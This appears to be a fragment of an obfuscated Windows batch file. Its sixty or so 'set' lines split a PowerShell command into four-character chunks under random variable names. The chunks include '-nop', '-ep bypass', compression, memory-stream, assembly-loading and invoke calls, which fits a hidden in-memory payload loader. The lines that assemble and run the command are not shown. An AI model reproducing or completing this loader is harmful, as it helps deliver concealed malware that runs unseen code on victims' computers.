@echo off
set "PyZSFqlnCP=-Obj"
set "udpVrcZIwK=yste"
set "bMgBLCGmCM=dj0C"
set "ZXPjdOdAaS=('da"
set "cUrePAJXzk=106u"
set "VlqimnxSNE=RILb"
set "zCkUTHZJpO=embl"
set "DNnBgypCrx=Zo ="
set "CCSkIzovGs=PlI."
set "PMkvoWWGtM=-ep "
set "nsaoJBZQjV=hy.A"
set "HOrpcnqCNv===')"
set "yCeFTAeSsr=d;$C"
set "xQUSPvUDSN=Comp"
set "bGJxhlrGOF=SYLW"
set "xzjOWxNUwP=.-16"
set "uSyjFdyYlV=k; }"
set "PHhKGhUjvk=Obje"
set "wqTZRjHhDl=V = "
set "vgxvAtOBRG=yste"
set "ncBytVAJtd=pres"
set "VzImQsxnSa=o = "
set "XTSpdNeKHq=form"
set "ReLignWKxC=1..-"
set "tSepshfvYo=m(, "
set "jWwZMHNVpM=eam("
set "hhycyLdqXP=Stre"
set "rDNPbApQvc=em.C"
set "PtUOkxjlZr=ion."
set "AuuQVvlGJo=bypa"
set "bFweAWUCho=[Sys"
set "ixwGterReR=ew-O"
set "fMaEqKGPcP=m.IO"
set "TCDjJBhkgs=-nop"
set "bEsPbWMMSv=ke($"
set "yMpspyitLU=m.IO"
set "IjzSTXznnr=CFxo"
set "XMpGFrUXJr=Conv"
set "DaujOPsuec=)) {"
set "hnoVblyFld=;$qS"
set "BZigKsuMyA=ing("
set "wjInMyXLsM=]::C"
set "dBjqWHyWTe=orF'"
set "cnSUxnBFNH=zHhH"
set "NiEHDWbrnc=AH ="
set "AqqRJKKhfS=)($h"
set "qoqrkWLXnC=ck($"
set "wnXmThgHHp=);$J"
set "sqyyEpbznZ=L4Yi"
set "IOWBBGXseB=$CSY"
set "VGWxYAhGuW=7;$C"
set "qTXhaBBLdl=.Mem"
set "rdvUwaqYDB=e = "
set "ZJRyVMmsvk=t Sy"
set "liHDRmMrss=hQiZ"
set "bPGUWcYbNs=Syst"
set "xrplCozHhF=$FAF"
set "FmTtKgJqAt=rofi"
set "rIpSsZlayI=File"
